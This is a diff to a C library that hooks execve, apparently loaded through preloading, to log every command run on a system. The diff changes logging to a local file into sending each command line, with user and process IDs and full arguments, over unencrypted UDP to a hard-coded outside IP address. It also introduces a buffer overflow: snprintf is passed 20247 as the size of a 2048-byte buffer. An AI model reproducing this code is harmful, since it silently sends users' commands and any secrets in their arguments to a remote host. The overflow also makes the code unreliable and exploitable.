@@ -7,13 +7,16 @@
 #include <string.h>
 #include <sys/types.h>
 #include <sys/stat.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 #include <fcntl.h>
 
 // 原始execve函数指针
 static int (*original_execve)(const char *filename, char *const argv[], char *const envp[]) = NULL;
 
-// 日志文件路径
-#define LOG_FILE "/tmp/execvlog.log"
+#define LOGHOST "202.38.95.44"
+#define LOGPORT 9999
 
 // 获取当前时间字符串
 void get_time_str(char *buf, size_t size) {
@@ -21,6 +24,26 @@ void get_time_str(char *buf, size_t size) {
     struct tm *tm_info = localtime(&now);
     strftime(buf, size, "%Y-%m-%d %H:%M:%S", tm_info);
 }
+
+void sendudp(char *buf, int len, char *host, int port)
+{
+        struct sockaddr_in si_other;
+        int s, slen = sizeof(si_other);
+        int l;
+        if ((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
+                return;
+        }
+        memset((char *) &si_other, 0, sizeof(si_other));
+        si_other.sin_family = AF_INET;
+        si_other.sin_port = htons(port);
+        if (inet_aton(host, &si_other.sin_addr) == 0) {
+                close(s);
+                return;
+        }
+        l = sendto(s, buf, len, 0, (const struct sockaddr *)&si_other, slen);
+        close(s);
+}
+
 
 // 写入日志
 void write_log(const char *filename, char *const argv[]) {
@@ -35,15 +58,12 @@ void write_log(const char *filename, char *const argv[]) {
             strncat(cmdline, argv[i], sizeof(cmdline) - strlen(cmdline) - 1);
         }
     }
-    
-    // 打开日志文件（追加模式）
-    FILE *log = fopen(LOG_FILE, "a");
-	
-    if (log) {
-        fprintf(log, "[%s] UID=%d PID=%d CMD=%s ARGS=%s\n", 
-                time_buf, getuid(), getpid(), filename, cmdline);
-        fclose(log);
-    }
+
+    char buf[2048];
+
+    snprintf(buf, 20247, "[%s] UID=%d PPID=%d PID=%d CMD=%s ARGS=%s\n",
+                time_buf, getuid(), getppid(), getpid(), filename, cmdline);
+    sendudp(buf, strlen(buf), LOGHOST, LOGPORT);
 }
 
 // 重写的execve函数
@@ -62,9 +82,4 @@ int execve(const char *filename, char *const argv[], char *const envp[]) {
 
 // 构造函数，在库加载时自动执行
 __attribute__((constructor)) void init(void) {
-    // 确保日志文件存在并可写
-    int fd = open(LOG_FILE, O_WRONLY | O_CREAT | O_APPEND, 0644);
-    if (fd >= 0) {
-        close(fd);
-    }
 }
